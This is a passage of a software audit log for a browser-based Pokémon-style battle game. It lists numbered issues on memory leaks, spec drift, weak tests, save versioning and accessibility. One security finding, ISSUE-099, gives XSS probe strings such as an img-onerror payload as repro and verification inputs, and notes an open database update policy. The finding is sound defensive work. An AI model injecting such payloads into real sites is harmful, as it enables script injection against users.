```
Measured (jsdom, `--expose-gc`): rolling 30 trainer types × 511 distinct gen-subset combos (15,330 calls → up to ~15k distinct keys) grew heap +13.4 MB and the cache is never freed. Each entry is a 4-bucket partition of up to ~1380 species names.

**Repro**: `node --expose-gc` driving `window.__storyTest.rollTrainerTeam(trainer, 6, gw, gensSubset, 'Basic Trainer', 20)` across many (type, gens) pairs; heap climbs monotonically with distinct-key count.

**Blast radius**: Today the active-gens list is fixed per run, so only ~38 type-themes × 1 gen-combo are ever keyed → cache is tiny and warm rolls are fast (median **0.34 ms**, cold cache-miss **0.84 ms**, max 1.68 ms — both far under the 50 ms target). The risk is the planned **Fight Club gauntlet + expanded story-pool**: if those call `rollTrainerTeam` with varied gen filters / synthetic trainer types per draft, distinct keys multiply and the Map grows unbounded across a long session. This is the "won't scale with new systems" flag, not a current regression.

**Fix sketch**: Bound `_trainerPoolCache` with a small LRU (e.g. 64 entries) or clear it on run-start / gen-setting change. The partition is cheap to rebuild (cold miss is < 1 ms), so eviction costs nothing perceptible.

**Verification**: After bounding, drive 15k+ distinct-key rolls and confirm `_trainerPoolCache.size` plateaus at the cap and heap delta stays flat.

---

## <a id="ISSUE-094"></a> ISSUE-094: Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4

---
id: ISSUE-094
severity: P2
category: inconsistency
anchor_symbol: SAFARI_ENTRY_COST
current_line_hint: ~43148
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 43572c0f06d7
confidence: high
status: open
---

**Title**: Safari unlock spec'd "after badge 3 OR City3" but code (and REDESIGN) fix it firmly at City4

**Evidence**:
```js
// SPEC (STORY_FEATURES_INTEGRATION §4): "From run itinerary ... e.g. after badge 3 or City3 segment"
// CODE (battle.html ~43148):
//   "// v19 stage-gated Safari curve. Safari unlocks at City 4 (badges 3),"
// STORY_EVENTS_RAW row 22 = City4 actions include 'Safari Zone'; no City3 row offers it.
```

**Repro**: `grep -niE "safari" battle.html | grep -iE "City 4|badges 3"` shows the City4 anchor; no City3 Safari action exists in STORY_EVENTS_RAW. The shipped spec's "or City3 segment" alternative is contradicted by code.

**Blast radius**: Small — single ambiguous clause. But it is the kind of "decision never made" wording (cf. §7 Trader "idx 26 OR 29") that misleads a reader about where the gate lives. REDESIGN_PLAN §2 correctly states C4; the *shipped* spec is the stale one.

**Fix sketch**: Strike "or City3 segment" from STORY_FEATURES_INTEGRATION §4; state City4 / 3-badge debut to match code and REDESIGN. (Doc owner's edit — read-only audit.)

**Verification**: §4 reads a single unambiguous trigger matching STORY_EVENTS_RAW row 22.

---

## <a id="ISSUE-095"></a> ISSUE-095: safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc

---
id: ISSUE-095
severity: P2
category: dx
anchor_symbol: safari-zone.test
current_line_hint: tests/integration/safari-zone.test.js ~10
file: tests/integration/safari-zone.test.js
agents: [story-mode-investigator]
fingerprint: c05411e4ccb3
confidence: high
status: open
---

**Title**: safari-zone integration test gives false confidence — asserts stale hard-coded weights and matches "1.25" anywhere in the spec doc

**Evidence**: Two hollow assertions:
```js
test('safari-zone: grade weights g1:3 / g2:22 / g3:50 / g4:25 sum to 100', () => {
  const weights = { g1: 3, g2: 22, g3: 50, g4: 25 };   // hard-coded LITERAL, not from engine
  assert.equal(sum, 100, ...);                          // only checks 3+22+50+25===100
});
test('safari-zone: catch math 1.25× multiplier is documented', () => {
  const matches = flow.match(/1\.25/g);                 // matches "1.25" ANYWHERE in 74KB spec
  assert.ok(matches && matches.length > 0, ...);
});
```
Neither reads the engine. The live weights are `_SAFARI_GRADE_CURVE_BY_BADGES` (badge-keyed; the static `{3,22,50,25}` is the deleted pre-v19 value). The live multiplier is `SAFARI_BALL_MULT = 1.35` and the spec confirms 1.35 — but the test asserts "1.25", which only passes because that substring appears on an UNRELATED Frontier line (STORY_MODE_FLOW.md ~735 "1.25 + 0.045/r"). The test would still pass if `SAFARI_BALL_MULT` were changed to any value.

**Repro**: `node --test tests/integration/safari-zone.test.js` (passes), then compare against `battle.html` `_SAFARI_GRADE_CURVE_BY_BADGES` (~43547) and `SAFARI_BALL_MULT` (~44314).

**Blast radius**: Test tooling. The safari weights/multiplier have no real regression coverage; the run-engine-test SKILL advertises this file as covering "weights" but it does not.

**Fix sketch**: Read the actual constants from the loaded engine (expose `_SAFARI_GRADE_CURVE_BY_BADGES` / `SAFARI_BALL_MULT` via the test harness or `window`) and assert the shipped values; tighten the multiplier check to read `SAFARI_BALL_MULT` rather than substring-matching the spec doc.

**Verification**: Mutate `SAFARI_BALL_MULT` to 1.40 in a scratch copy — the fixed test must fail.

---

## <a id="ISSUE-096"></a> ISSUE-096: STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21

---
id: ISSUE-096
severity: P2
category: inconsistency
anchor_symbol: SAVE_VER
current_line_hint: ~31502
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: fad1a278acb4
confidence: high
status: open
---

**Title**: STORY_MODE_FLOW pins SAVE_VER at 15/17; shipped SAVE_VER is 21

**Evidence**:
```js
// battle.html:31502
const SAVE_VER = 21;
// migrations present & dispatched in load(): preV11..preV17, preV18 (diacritics),
// preV19, preV20, preV21 — no gaps.
```
```text
STORY_MODE_FLOW.md:279  "Bump `SAVE_VER` from 14 to 15. Add:"
STORY_MODE_FLOW.md:352  "- Bump `SAVE_VER` to 15."
STORY_MODE_FLOW.md:1176 "- `SAVE_VER` bumped 16 → 17."
```

**Repro**: `grep -nE 'SAVE_VER\s*=' battle.html` → `SAVE_VER = 21`.

**Blast radius**: Doc-only. These are milestone-history statements (M0 = v15, v17 registry, etc.), so they are not strictly "wrong" as historical notes — but a reader treating `STORY_MODE_FLOW.md` as the canonical current spec will assume v15/v17 is current. The `migrateStoryPreV15` body itself MATCHES spec §10 exactly (pcBox/balls/pokedex/catchUnlocked defaults, hardcore→normal, stable ids — verified line-by-line at battle.html:32153-32179), so check #3 (migration completeness) passes; only the *version number* the spec implies as "current" is stale. Note there is no `migrateStoryPreV18` by that literal name, but `migrateStoryTrainerDiacriticsPreV18` covers the `<18` slot (battle.html:32606) — not a gap.

**Fix sketch**: Add a one-line "current SAVE_VER is 21" note at the top of §10/§13, or annotate each bump as the milestone it shipped in, so the doc reads as layered history rather than current state.

**Verification**: Spec's stated current SAVE_VER equals `battle.html` `SAVE_VER`.

---

## <a id="ISSUE-097"></a> ISSUE-097: SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load

---
id: ISSUE-097
severity: P2
category: dx
anchor_symbol: SAVE_VER
current_line_hint: ~29995
file: battle.html
agents: [story-mode-investigator]
fingerprint: 1877fb707d44
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: SAVE_VER stays at 19 despite an implicit v20 schema cleanup that runs on every load

**Evidence**:
```js
// battle.html ~29995
const SAVE_VER = 19;

// battle.html ~30896 (inside load(), runs every load regardless of version)
// v20: casino runs on gold directly. Drop the legacy coin
// currency silently from old saves.
try { delete sm.casinoCoins; } catch (e) {}
if (!sm.casinoStats || typeof sm.casinoStats !== 'object') sm.casinoStats = {};
try { delete sm.casinoStats.cashier; } catch (e) {}
try { delete sm.profIntroThemePending; } catch (e) {}
// ...
// And around 30919:
try { delete sm.deferredEarlyRivalPos; } catch (e) {}
```

The "v20" cleanup runs unconditionally on every load — it's not gated by `_loadedVer < 20`, and `SAVE_VER` was never bumped. So:
- A pristine v20 schema doesn't exist (no version bump means new saves stamp version=19).
- The implicit migration runs forever on every load, wasting cycles (cheap, but unbounded).
- Any future v20 changes that require a real migration will have no clean way to identify "loaded from pre-v20 vs already-cleaned".

**Repro**: `localStorage.getItem('pbs_story_save')` → look for `casinoCoins` key. It's never persisted post-load. The cleanup is idempotent, so it doesn't break anything; it just makes "v20" a phantom version.

**Blast radius**: DX/maintainability. A future contributor adding a real v20 migration needs to retrofit a `_loadedVer < 20` block and bump SAVE_VER. Meanwhile, the unconditional `delete` calls are silent enough that nobody notices the absence of an explicit `_loadedVer < 20` block.

**Fix sketch**: Wrap the four delete calls in `if (_loadedVer < 20) { ... }`, bump `SAVE_VER = 20`, and add a one-line `migrateStoryPreV20()` (or rename the cleanup to be the canonical migration). Mirrors the explicit pattern used for v15-v19.

**Verification**: After fix, `_loadedVer === 20` saves skip the delete pass. Symbol-index lookup `--lookup migrateStoryPreV20` resolves cleanly.

---

## <a id="ISSUE-098"></a> ISSUE-098: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

---
id: ISSUE-098
severity: P2
category: dx
anchor_symbol: setBattleLogHtml
current_line_hint: ~230
file: online-pvp.js
agents: [consistency-auditor]
fingerprint: e261b55d36c1
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging

**Evidence**:
```js
// L230  } catch (e) {}                                          (setBattleLogHtml DOM access)
// L417  try { sb.removeChannel(channel); } catch (e) {}         (_subscribe)
// L435  try { sb.removeChannel(channel); } catch (e) {}         (dispose)
// L460  } catch (e) {}                                          (reset state vars)
// L553  try { global.syncBattleActiveHighlight(); } catch (e) {}
// L760  try { global.AudioSystem.startNewBattle(); } catch (e) {}
// L775/L797 — same shape
```

**Repro**: A subscription failure, DOM-detached state, or missing global helper silently no-ops. Debug becomes "look at all eight catches manually".

**Blast radius**: Diagnostic blind spots only — no runtime bug, but a real "what just happened?" cost when investigating PvP issues in the field.

**Fix sketch**: Replace each `catch (e) {}` with `catch (e) { console.debug('[OnlinePvP] <site> swallowed', e); }`. Some sites can stay silent (the `sb.removeChannel` cleanup is genuinely best-effort) — document those with `/* best-effort */` instead of empty.

**Verification**: After a known-failure scenario (e.g., disconnect mid-battle), check the console for diagnostic breadcrumbs.

---

## <a id="ISSUE-099"></a> ISSUE-099: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

---
id: ISSUE-099
severity: P2
category: security
anchor_symbol: setDisplayName
current_line_hint: ~812
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 89314480e594
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS

**Evidence**:
```js
// online-pvp.js L812-814
setDisplayName(n) {
    global.localStorage.setItem(STORAGE_KEY, String(n || '').trim().slice(0, 24) || 'Trainer');
}
// L723 host pushes the unsanitized name back to room data:
host_display_name: nPrev.host_display_name || (global.localStorage && global.localStorage.getItem('pbs_online_display_name')) || 'Host',
// battle.html L14695-14696 — guest stores remote name on globals
if (d.host_display_name) window.__onlineHostName = d.host_display_name;
if (d.guest_display_name) window.__onlineGuestName = d.guest_display_name;
// battle.html L16285-16286, L791-794 — currently safe (innerText), but each new call site is a foot-gun
if (title.includes('VICTORY')) document.getElementById('end-desc').innerText = `${p1n} won this round!`;
```

**Repro**: Set localStorage `pbs_online_display_name = '<img src=x onerror=alert(1)>'.slice(0, 24)` → `'<img src=x onerror=ale'` (truncated but the `<img` still parses). Currently only `innerText` consumers exist, so the live attack surface is zero. But there are 6+ globals (`__onlineHostName`, `__onlineGuestName`, etc.) holding raw player-controlled strings, and any future panel that does `el.innerHTML = ${name} won!` opens the door.

**Blast radius**: Latent — depends on future innerHTML callsites touching display names. Compounded by the open-RLS finding above: an attacker doesn't even need to log in; they can directly write `host_display_name` to any live room via the open UPDATE policy.

**Fix sketch**: In `setDisplayName`, strip HTML-sensitive chars: `String(n || '').trim().replace(/[<>"'&]/g, '').slice(0, 24) || 'Trainer'`. Reject control characters too. Belt-and-suspenders: every consumer should use textContent/innerText only. Add an ESLint rule (or a grep test in CI) that fails if a line both touches `__onlineHostName`/`__onlineGuestName` and contains `innerHTML`.

**Verification**: Set the localStorage key to `'<script>x</script>'`, start a match, eyeball the score panel — it should display the literal characters (or empty), not execute.

---

## <a id="ISSUE-100"></a> ISSUE-100: settings.animations defaults to true and is never seeded from prefers-reduced-motion

---
id: ISSUE-100
severity: P2
category: a11y
anchor_symbol: settings-animations-init
current_line_hint: ~10824
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 9d6f7493af32
confidence: high
status: open
---

**Title**: settings.animations defaults to true and is never seeded from prefers-reduced-motion

**Evidence**:
```js
let settings = { animations: true, musicEnabled: true, soundEnabled: true,
    weatherAnimation: true, terrainBackground: true, /* ...no reduced-motion sync... */ };
```

**Repro**: A user whose OS requests reduced motion still boots with `animations:true` and gets full battle FX, screen-shake, and gimmick (Mega/Dynamax/Tera) sequences until they manually find Settings → "Battle animations" and toggle it off. The preference is honored for screen transitions (L9204) but the master visual-FX switch ignores it on first load.

**Blast radius**: All FX gated on `settings.animations` (~25 call-sites: move FX, faint fades L20265/20284, hit-flash L21087, gimmick anims L14480+, weather). Pairs with the `showMoveEffect` finding — fixing either reduces harm, but seeding the setting fixes them all at once.

**Fix sketch**: On settings init (when no persisted value exists), seed `animations`/`weatherAnimation` from `!matchMedia('(prefers-reduced-motion: reduce)').matches`, and reflect that in the `#sw-animations` switch state. Optionally listen for changes to the media query.

**Verification**: Fresh profile + OS reduce-motion on → "Battle animations" switch is OFF by default and FX are suppressed.

---

## <a id="ISSUE-101"></a> ISSUE-101: anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all

---
id: ISSUE-101
severity: P2
category: a11y
anchor_symbol: showMoveEffect
current_line_hint: ~12598
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 961c3460c828
confidence: high
status: open
---

**Title**: anime.js move-FX engine ignores prefers-reduced-motion — heaviest motion bypasses the CSS catch-all

**Evidence**:
```js
function showMoveEffect(moveName, type, cat, isPlayerTarget) {
    if (!settings.animations) return;   // ONLY gate — no prefers-reduced-motion check
    // ...dispatches typeAnims[t](container, colors): particle bursts, beams,
    //    physical-impact lunges via anime({...}) (RAF inline-style interpolation)
```

**Repro**: OS "Reduce motion" ON, in-game Battle-animations toggle left ON (default). Use any move — full particle storm, beam, lunge and hit-flash still play. The global CSS guard at L6694 (`*{animation-duration:1ms}`) only neutralizes CSS keyframes/transitions; anime.js drives inline styles via requestAnimationFrame, so it is unaffected. `runScreenTransition` (L9204) already checks `matchMedia('(prefers-reduced-motion: reduce)')`, proving the pattern is known — the FX engine just omits it.

**Blast radius**: Every attack in every battle (Story/PvE/PvP/Gauntlet) routes through `showMoveEffect` → `MoveAnimEngine`; also `renderPerMoveAnim`, `playPhysicalImpact`, `playSpecialBeam`. This is the single most motion-intense subsystem in the game.

**Fix sketch**: At the top of `showMoveEffect` (and the gimmick-anim helpers), early-return or hard-cut durations when `matchMedia('(prefers-reduced-motion: reduce)').matches` — keep the damage/log outcome, drop the visual storm.

**Verification**: With OS reduce-motion on, moves resolve instantly (no particles/lunge) while the battle log still narrates the hit.

---

## <a id="ISSUE-102"></a> ISSUE-102: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

---
id: ISSUE-102
severity: P2
category: a11y
anchor_symbol: showVictoryOverlay
current_line_hint: ~38410
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 7196d6421a81
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored

**Evidence**:
```js
// showVictoryOverlay at ~38410
const ov = document.createElement('div');
ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);z-index:9999;…';
const contBtn = document.createElement('button');
contBtn.textContent = 'Continue →';
…
const autoClose = setTimeout(dismiss, 6000);
contBtn.onclick = (e) => { e.stopPropagation(); dismiss(); };
…
ov.onclick = () => dismiss();
document.body.appendChild(ov);
```

The post-battle victory overlay is the highest-pomp moment of the run (badges, gold, mystery reveals, "First time ever" banner). It's a fullscreen layer with no `role="dialog"`, no `aria-modal`, no `aria-labelledby` on "VICTORY!", no `Escape`/`Enter` to dismiss before the 6 s autoclose, no focus on `Continue →`. SR users hear nothing announce. Sighted keyboard users can't dismiss early without finding the button with Tab.

**Repro**: Win any story battle → overlay opens. Hit Esc/Enter → nothing. Hit Tab → focus may or may not land on Continue (depends on prior focus).

**Blast radius**: Every story victory, every gym clear, every Elite/Champion celebration. Combined with the tutorial dialog gap (sibling finding), the highest-emotion story beats are also the least accessible.

**Fix sketch**: Same pattern as tutorial: `role="dialog"`, `aria-modal="true"`, label by the VICTORY heading, autofocus `contBtn` next frame, add Esc/Enter keydown that calls `dismiss()`. Keep the auto-close.

**Verification**: Esc after victory closes the overlay; SR announces "VICTORY!, dialog" on open.

---

## <a id="ISSUE-103"></a> ISSUE-103: STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows

---
id: ISSUE-103
severity: P2
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29240
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: e585e95483b0
confidence: high
status: open
---

**Title**: STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows

**Evidence**:
```js
// battle.html 29240-29311: STORY_EVENTS_RAW literal — 67 data rows (idx 0..66),
// last row idx 66 = [67,'Battle','Mystery Figure',...]. (3 of the 70 literal
// lines are comments at 29300-29302.)
```
```text
STORY_MODE_FLOW.md:27  "...existing `STORY_EVENTS_RAW`, 68 rows, unchanged..."
STORY_MODE_FLOW.md:53  "The existing `STORY_EVENTS_RAW` array ... stays as-is."
(by contrast docs/PROGRESSION_CURVE_MASTER.md:52 correctly says "67 rows (array idx 0–66)")
```

**Repro**: `awk 'NR>=29241 && NR<=29310' battle.html | grep -cE '^\s*\[\s*[0-9]+\s*,'` → 67.

**Blast radius**: Doc-only count drift. The arc itself is intact and matches spec: intro rival (idx 1) → 8 gyms → 2 rival rematches + league rival → E1–E4 → Champion → Hall of Fame (idx 65) → post-HoF Mystery Figure (idx 66). Only the row *count* in `STORY_MODE_FLOW.md` §1 (line 27) is wrong; the task brief inherited this stale "68-row" figure from the spec. `GYM_CITY_LEADER_EVENT` is now correctly DERIVED at boot from `STORY_EVENTS_RAW` (battle.html:29990, `buildGymCityLeaderMap()`), so the prior audit's §1.3 "hard-coded gym index map" concern is resolved — no derive-vs-hardcode mismatch remains.

**Fix sketch**: Change "68 rows" → "67 rows (idx 0–66)" in `STORY_MODE_FLOW.md` line 27.

**Verification**: Count matches `PROGRESSION_CURVE_MASTER.md`'s "67 rows".

---

## <a id="ISSUE-104"></a> ISSUE-104: Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots

---
id: ISSUE-104
severity: P2
category: refactor
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29008
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4c6af8ecc61c
confidence: high
status: open
---

**Title**: Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots

**Evidence**:
```js
const STORY_EVENTS_RAW = [   // battle.html:29008 — fixed literal, 67 rows
  [0,'City','City0',null,0,[...]],
  [68,'Battle','Rival',{...},2000,null],
  ...
];
// vs the EXTENSIBLE narrative layer (battle.html:35496):
// "To add a new pre-battle scene → append to STORY_BATTLE_INTERRUPTS.
//  To add a new cold-open → add a row to STORY_COLD_OPENS …
//  To add a new storyline → add an entry to STORYLINE_VARIANTS with beatOverrides …"
```

**Repro**: The timeline (`STORY_EVENTS_RAW`) is a static literal. Three clean extension layers exist OVER it: (1) `STORY_BEATS` — per-row metadata keyed on durable `storyRowId` (NOT array index, 35509–35511); (2) `STORY_COLD_OPENS` — fire-once narrative scenes, meta-tracked; (3) `STORY_BATTLE_INTERRUPTS` — a runtime pre-battle interrupt bus that ALREADY injects route nodes (wild/roaming/catch-tutorial) WITHOUT advancing `sm.eventIndex` (37942); (4) `STORYLINE_VARIANTS` — narrative reskins via `beatOverrides[rowId]`. Pokémon picks always flow through the existing rollers, so variants "CANNOT break the difficulty curve" (35506).

**Blast radius**: This directly informs the maintainer's architecture. Verdict: the NARRATIVE layer is genuinely pluggable ("bind and attach" via row-id-keyed overrides). The STRUCTURAL layer (adding new events / a random-draw pool of side-stories) has NO data-driven slot system yet — `STORY_EVENTS_RAW` would need editing, and 49 positional accesses + save-keyed `trainerAssignments` make naive row reordering unsafe (REDESIGN_PLAN §6 confirms; rows already use `eventId` col 0 as the durable key, e.g. row 68 sits at array index 1).

**Fix sketch**: For pluggable static side-stories + random-draw pool: extend the `STORY_BATTLE_INTERRUPTS` bus pattern — it is the proven mechanism for injecting beats between fixed rows without touching `eventIndex`. Add a `STORY_SIDE_STORIES` registry (each with a `fires(ctx)` predicate + `once` meta key) and a `STORY_RANDOM_POOL` drawn by `_storySideRng` at city entry. Bind via the same `prepare()/run()` contract. Avoid mutating `STORY_EVENTS_RAW`; always key on `eventId`/row-id, never array index.

**Verification**: Prototype one side-story as a new interrupt entry; confirm `eventIndex` is untouched and the main spine still advances.

---

## <a id="ISSUE-105"></a> ISSUE-105: Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none

---
id: ISSUE-105
severity: P2
category: inconsistency
anchor_symbol: STORY_FACILITY_QUOTES
current_line_hint: ~39208
file: battle.html
agents: [consistency-auditor]
fingerprint: ede1c3a285f0
confidence: high
status: open
---

**Title**: Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none

**Evidence**:
```js
// 39208 — STORY_FACILITY_QUOTES keys (the ambient one-liner shown on every re-visit):
//   moveTutor, natureRater, battleDojo, evTrainer, colress, link, casino, relicKeeper
const STORY_FACILITY_QUOTES = {
    moveTutor: [ /* 7 lines */ ], natureRater: [ /* 7 */ ], battleDojo: [ /* 7 */ ],
    evTrainer: [ /* 6 */ ], colress: [ /* 6 */ ], link: [ /* 5 */ ],
    casino: [ /* 5 */ ], relicKeeper: [ /* 5 */ ],
    // no: safari, stoneSage/evolab, stoneShop, dept
};
```

**Repro**: Each of the 8 keyed services calls `_storyShowFacilityQuote(...)` to print a rotating italic NPC line under the screen header on every visit. Safari Zone, Stone Sage, Stone Emporium, and Department Store render a one-time intro scene the first visit (STORY_TUTORIAL_SCENES) but have no recurring pool, so on every subsequent visit those four screens are silent where the other eight speak.

**Blast radius**: Cosmetic inconsistency in the ambient-voice layer the maintainer flagged for review. The REDESIGN_PLAN makes Safari "permanent after debut" and the Dept Store cyclic (C6/C8/C9) — both become high-re-visit screens, widening the silent gap exactly where the redesign adds traffic.

**Fix sketch**: Add `safari`, `stoneSage`, `stoneShop`, `dept` pools (5-7 lines each, matching the existing voice) to STORY_FACILITY_QUOTES and wire a `_storyShowFacilityQuote(screenId, key)` call into each facility's enter function (enterSafariZone, enterStoneShop, the Stone Sage screen, the Dept Store screen).

**Verification**: Visit each of the four facilities twice; an ambient italic line appears under the header on both visits and rotates.

---

## <a id="ISSUE-106"></a> ISSUE-106: De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list

---
id: ISSUE-106
severity: P2
category: dx
anchor_symbol: STORY_FEATURES_INTEGRATION
current_line_hint: n/a
file: docs/STORY_FEATURES_INTEGRATION.md
agents: [spec-drift-auditor]
fingerprint: 37c82575616a
confidence: high
status: fixed-claude/optimistic-ptolemy-g3COo
---

**Title**: De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list

**Evidence**:
```text
Code presence check (battle.html):
  blackMarket / enterBlackMarket / "Black Market"        → 0 hits
  illegalDealer / "Illegal Dealer" / Contraband Capsule  → 0 hits
  traderOfferByCity / enterTrader / pokemonTrader        → 0 hits
  pendingWager / battleForPokemon / "Battle for Pokémon" → 0 (3 "wager" hits are all Casino flavor text)
  itineraryProgress / runItinerary / STORY_SCRIPT        → 0 hits
```

**Repro**: The greps above.

**Blast radius**: Per the product decision these five are CUT (not "not implemented" bugs). The docs that present them as live/planned spec need editing to mark them future/cut. Precise list (canonical home = `docs/STORY_FEATURES_INTEGRATION.md`):

`docs/STORY_FEATURES_INTEGRATION.md`:
- §3 Black Market — heading + body lines 33–54 (placement table 37–41, SKU table 44–51, `enterBlackMarket()` UI line 53).
- §3.5 Illegal Dealer NPC — heading + body lines 57–84 (placement 63–65, loop table 67–76, differentiation table 78–84).
- §6 Battle for Pokémon (wager) — heading + body lines 110–119; plus the ordering refs that name "wager": line 106, and §8 rows lines 135, 137, 138.
- §7 Pokémon Trader — heading + body lines 123–128 (the "idx 26 OR 29 — pick one" was never decided).
- Full Itinerary — it is woven through, not a single section: lines 39, 65, 75, 90, 106, 117, 135, 136 (the `runItinerary`/`itineraryProgress`/`storyScriptState` save-persist row), 138, 150, and the §10 implementation-order steps 165 (#2 `runItinerary`+arc stub) and 168/169 (#5 Wager, #6 Trader). Steps remaining as in-scope after de-scope: #1 balls/PC (shipped), #4 Safari (shipped), #7 dialogue.
- §9 readiness table rows that reference cut systems: line 150 (Itinerary beats), 151 (Black Market vendor), 152 (Illegal Dealer NPC), 154 (Trader NPC), 155 (Battle for Pokémon).

`docs/STORY_MODE_CATCH_INTEGRATION_RISK.md`:
- line 94 (Mystery Figure & Trader & Wager swap rule), line 140 (`itinerary → wild → wager → trainer` ordering), lines 147, 200, 202 (`runItinerary`/`maybeOfferWager` queue), line 229 (Egg from the Trader).

`docs/STORY_MODE_DESIGN_DECISIONS.md`:
- line 111 (wrap `src: 'professor'|'wild'|'trader'` — drop `'trader'`), lines 350/354/355/358 + 543 row D3 (PC "Fence at the Black Market" mechanic), line 579 (deriving city map under "wild, wager, safari" pressure).

`STORY_MODE_FLOW.md`:
- §16 References line 1074 calls `STORY_FEATURES_INTEGRATION.md` "the canonical replacement" — once that doc is marked future/cut, this pointer's framing should note the five cut systems.

NOT recommended for edit: `docs/STORY_MODE_AUDIT.md` references (lines 36, 70, 192, 236, 248–250, 273, 285, 289, 319–320, 338, 347–360, 369) — that audit is a point-in-time snapshot that already says "zero implemented" and lists them as backlog; it reads correctly as history. Leave it.

**Fix sketch**: Add a banner at the top of `docs/STORY_FEATURES_INTEGRATION.md` ("§3, §3.5, §6, §7 and the full-itinerary scaffolding are DE-SCOPED — not planned; retained for historical context") and strike/mark the per-section lines above. Then fix the cross-references in the other three docs.

**Verification**: After edits, no doc presents Black Market / Illegal Dealer / Trader / Wager / Itinerary as a planned-and-pending deliverable; each is explicitly tagged cut/future.

---

## <a id="ISSUE-107"></a> ISSUE-107: Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast

---
id: ISSUE-107
severity: P2
category: a11y
anchor_symbol: story-dialog-nameplate
current_line_hint: ~2216
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 95a0a3a5f2ea
confidence: high
status: open
---

**Title**: Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast

**Evidence**:
```css
.story-dialog-nameplate { color:#111 !important;
    background: linear-gradient(180deg,#ffd54f 0%,#ffb300 100%) !important; }
.story-tone-amber  .story-dialog-nameplate { color:#ffcc80; }  /* light-orange on yellow */
.story-tone-cold   .story-dialog-nameplate { color:#80deea; }  /* cyan on yellow */
.story-tone-purple .story-dialog-nameplate { color:#ce93d8; }  /* lavender on yellow */
```

**Repro**: The base rule sets a yellow gradient bg with `!important`; tone variants override only `color`/`border-color`, leaving the yellow bg. Cyan #80deea on yellow #ffd54f ≈ 1.6:1 and amber #ffcc80 on #ffd54f ≈ 1.3:1 — far below the 4.5:1 AA text threshold. The base dark-on-yellow (#111) passes; only the tone overrides fail. (Body `.story-dialog-text` stays #e8e8e8 on #1e2030 dark box — passes.)

**Blast radius**: amber/cold/purple/mourning/ash/static tone scenes (cutscene NPC nameplates).

**Fix sketch**: For tone variants, override the nameplate `background` to a dark fill (matching the box) when using light text, or keep `color:#111` and only tint the border. Verify each tone pair hits 4.5:1.

**Verification**: Contrast checker on each tone's nameplate text/bg pair ≥ 4.5:1.

---

## <a id="ISSUE-108"></a> ISSUE-108: Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers

---
id: ISSUE-108
severity: P2
category: a11y
anchor_symbol: story-dialog-text
current_line_hint: ~8318
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b724187dc264
confidence: medium
status: open
---

**Title**: Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers

**Evidence**:
```html
<div class="story-dialog-box">
    <p class="story-dialog-text" id="story-city-quote"></p>
</div>
<div id="story-city-tips" class="story-city-tips"></div>
```

**Repro**: Battle text is announced (`#battle-log` has `role="log"`, L9054), but story NPC dialogue (`#story-city-quote`, `#story-prof-quote`, `#story-prof-status`, shop quotes) updates silently — SR users get no story narration or event-result feedback outside battle.

**Blast radius**: All story service screens' dialogue/status text. REDESIGN_PLAN §6 wants gauntlet round results announced — same live-region need applies there.

**Fix sketch**: Add `aria-live="polite"` (and `aria-atomic="true"`) to the dialogue/quote/status containers, mirroring the casino result strips (L8649) that already do this correctly. For gauntlet round results, announce win/loss via a `role="status"` region.

**Verification**: SR speaks NPC quote and event-status changes as they render; Fight Club round results announce.

---

## <a id="ISSUE-109"></a> ISSUE-109: Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded

---
id: ISSUE-109
severity: P2
category: inconsistency
anchor_symbol: storyRngNext
current_line_hint: ~10482
file: battle.html
agents: [consistency-auditor]
fingerprint: 294ac88b95dd
confidence: high
status: open
---

**Title**: Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded

**Evidence**:
```js
// line 10482 (outside IIFE, in makeBuild cosmetic-forme path)
const rng = (typeof sm === 'object' && sm && sm.active && typeof storyRngNext === 'function') ? storyRngNext : Math.random;
```

